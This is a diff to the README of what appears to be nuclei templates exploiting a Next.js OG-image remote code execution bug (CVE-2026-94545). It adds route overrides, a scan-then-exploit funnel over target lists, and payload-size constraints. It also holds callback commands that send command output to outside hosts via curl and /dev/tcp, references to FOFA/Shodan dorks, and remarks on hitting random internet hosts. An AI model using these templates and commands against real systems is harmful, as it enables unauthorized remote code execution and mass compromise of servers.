@@ -53,6 +53,11 @@ nuclei -u https://target.example -t CVE-2026-94545-rce.yaml
 # Exploit with an explicit command (<= 71 bytes) and no Interactsh
 nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http://10.0.0.5/x?i=$(id)'
 
+# The OG route is not always /api/og. Both templates try a list of common routes
+# by default and accept overrides:
+nuclei -u https://target.example -t CVE-2026-94545.yaml -var paths=/api/og,/og,/api/img,/render
+nuclei -u https://target.example -t CVE-2026-94545.yaml -var ogpath=/og
+
 # Targets on the default ports are the same run, just without the port in the URL:
 #   -u https://target   (443, spelled out or not)      -u http://target   (80)
 ```
@@ -143,6 +148,41 @@ The JavaScript protocol does not expose `BaseURL`, so the base is built from `{{
 and only one candidate when the base already carries a scheme or a port that identifies it
 (`80`, `443`). A candidate that cannot answer a benign request is skipped.
 
+## Scanning a list
+
+Two things decide whether a target can be hit, and neither of them is the port:
+
+1. **The route and the request shape.** Both templates try a list of paths
+   (`paths`, default `/api/og,/og,/api/og-image,/api/twitter-image,/opengraph-image,/twitter-image`)
+   and, per path, four shapes: POST body, `?value=`, `?text=`, `?title=`. Point `paths` at what
+   the target actually serves — the `og:image` meta tag and the App Router flight payload name
+   it, see [Finding candidates](#finding-candidates-fofa-shodan-google).
+2. **A body sink.** The payload is ~25 KB of SVG. Node rejects request URLs above
+   `maxHeaderSize` (16 KB default) with **HTTP 431**, so a route that only renders through
+   `?value=` can be *detected* but not exploited through the query string. The exploit template
+   says so explicitly instead of firing a payload that cannot arrive
+   (`lab/test-alt-paths.sh` proves both halves).
+
+The intended funnel, cheapest first:
+
+```bash
+# 1) reachability across the list - small probes, no payload, no destruction
+nuclei -l candidates.txt -t CVE-2026-94545.yaml -var paths=/api/og,/og,/opengraph-image -stats -o reachable.txt
+
+# 2) exploit only the hosts that matched, and let Interactsh confirm out of band
+nuclei -l reachable.txt -t CVE-2026-94545-rce.yaml -stats
+
+# 3) if you know the route (or the list is noisy), pin it and keep the payload off the wire
+nuclei -l reachable.txt -t CVE-2026-94545-rce.yaml -var ogpath=/og
+```
+
+Expect few results from a random internet list, and for reasons that are not template bugs: the
+host must run a Next.js version in range, on the Node runtime, with `sharp` installed, a route
+that feeds request data into `ImageResponse`, *and* the exact non-PIE Node 24.20.0 build the
+gadget addresses belong to. Anything else either refuses the payload (no `sharp` → sandboxed
+`resvg-wasm`), never renders it (no dynamic text), or aborts the worker instead of executing
+(a different Node build). The reachability template is what tells those cases apart.
+
 ## Finding candidates (FOFA, Shodan, Google)
 
 Neither the Next.js version nor the presence of `sharp` nor the existence of an OG route is
@@ -224,8 +264,10 @@ request is aborted (connection reset / empty reply) and the result has to come b
 band. A hit is an interaction on the Interactsh host — the default command runs
 `id >/dev/tcp/<interactsh host>/80`, which yields both the DNS callback and the TCP payload.
 `-var cmd=...` is available when the callback channel is already known and Interactsh is not
-in use. The scheme is settled with a benign request before delivery, so an aborted payload
-request is distinguishable from an unreachable target.
+in use. The scheme, the route and the request shape are settled with a benign request before
+delivery, so an aborted payload request is distinguishable from an unreachable target; the
+payload goes to the exact path and shape that answered `200` with an image. Because the
+payload is ~25 KB, only a body `POST` can carry it - see [Scanning a list](#scanning-a-list).
 
 ## Verification
 
@@ -252,6 +294,7 @@ nuclei" in `lab/README.md` for the same checks with the real tool).
 | Template payload vs the advisory's `exploit.py` (`lab/compare-payload.sh`) | byte-identical for `id`, `bash -c 'id>/dev/tcp/127.0.0.1/4444'` and a 71-byte command |
 | FOFA/Shodan markers (`lab/check-dorks.sh`) | 3/3: `opengraph-image` and `self.__next_f.push` present in a real Next.js 16.3.5 HTML response |
 | Standard ports (`lab/test-standard-ports.sh`) | 13/13: HTTP :80 and HTTPS :443 (self-signed, via `tls-proxy.py`) - detection, exploit, callback, worker replaced; implicit-443 and bare-host forms included |
+| Non-default OG route (`lab/test-alt-paths.sh`) | 10/10: the sink at `/og` is found by the default path list, by `-var ogpath=/og` and by `-var paths=/nope,/og`; exploit + callback there; a GET-only route is reported as "no body sink" (25 KB payload vs HTTP 431) instead of being fired blind |
 
 Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
 `nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
@@ -262,6 +305,9 @@ release downloads blocked), so the first run with the real binary is still worth
 ## Notes
 
 - Reference: <https://github.com/EQSTLab/CVE-2026-94545>
+- The payload needs a **request body**: ~25 KB does not fit in a URL (Node answers HTTP 431
+  above the 16 KB `maxHeaderSize` default). Query-string-only routes are detectable, not
+  exploitable.
 - The gadget addresses are pinned to the official Node.js `v24.20.0` linux-x64 build. On a
   different Node build the corruption usually kills the worker without executing the
   command, so a missing callback means "not exploitable here", not necessarily "not
